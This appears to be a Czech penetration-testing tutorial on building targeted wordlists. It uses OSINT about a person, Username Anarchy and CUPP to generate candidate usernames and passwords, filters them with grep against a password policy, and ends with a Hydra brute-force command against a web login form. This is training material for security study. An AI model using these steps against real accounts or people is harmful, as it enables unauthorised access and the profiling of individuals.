## 🎯 Proč vytvářet vlastní slovníky?

Univerzální slovníky (jako `rockyou.txt` nebo `SecLists`) pokrývají široké spektrum obecných hesel, ale při cíleném útoku na konkrétní firmu nebo osobu bývají neefektivní.

Vytvořením **slovníků na míru** (na základě OSINT průzkumu, sociálních sítí či konvencí cílové organizace) radikálně zmenšíme objem testovaných dat, zvýšíme přesnost a zrychlíme průnik.

## 👤 Generování uživatelských jmen: Username Anarchy

Různé organizace používají různé formáty uživatelských jmen (`j.smith`, `smithj`, `janes`, `jane.smith` atd.). Nástroj **Username Anarchy** automaticky vygeneruje všechny možné variace ze zadaného jména a příjmení.

### 🛠️ Instalace a použití:

Bash

```
# 1. Instalace závislostí a klonování repozitáře
sudo apt install ruby -y
git clone https://github.com/urbanadventurer/username-anarchy.git
cd username-anarchy

# 2. Vygenerování slovníku uživatelských jmen pro "Jane Smith"
./username-anarchy Jane Smith > jane_smith_usernames.txt
```

## 🔑 Cílená hesla: CUPP (Common User Passwords Profiler)

**CUPP** vytváří personalizované slovníky hesel na základě informací získaných o oběti (OSINT – jména, přezdívky, data narození, záliby, jména partnerů/domácích mazlíčků, klíčová slova).

### 🛠️ Instalace a vytvoření slovníku:

Bash

```
# Instalace
sudo apt install cupp -y

# Interaktivní spuštění
cupp -i
```

Při interaktivním zadávání vyplníte známé údaje (např. _First Name: Jane_, _Surname: Smith_, _Pet's name: Spot_, _Keywords: hacker,blue_, aktivujete Leet mode a přidání speciálních znaků/čísel).

CUPP vygeneruje komplexní soubor (např. `jane.txt` s cca 46 000 potenciálními hesly).

## 🧹 Filtrování slovníku podle politiky hesel

Pokud známe politiku hesel cílové organizace, můžeme slovník ze zhruba **46 000** hesel zredukovat na cca **7 900** vyhovujících kandidátů zřetězením příkazů `grep`:

#### Zadaná politika hesel:

- **Minimální délka:** 6 znaků
    
- **Obsahuje:** Velké písmeno, malé písmeno, číslo a **alespoň 2 speciální znaky** ze sady `[!@#$%^&*]`
    

Bash

```
grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

## 🚀 Závěrečný útok pomocí nástroje Hydra

Oba takto připravené a namíru vytvořené slovníky (`jane_smith_usernames.txt` a `jane-filtered.txt`) použijeme v Hydře proti přihlašovacímu formuláři:

Bash

```
hydra -L jane_smith_usernames.txt \
      -P jane-filtered.txt \
      <IP> -s <PORT> -f \
      http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```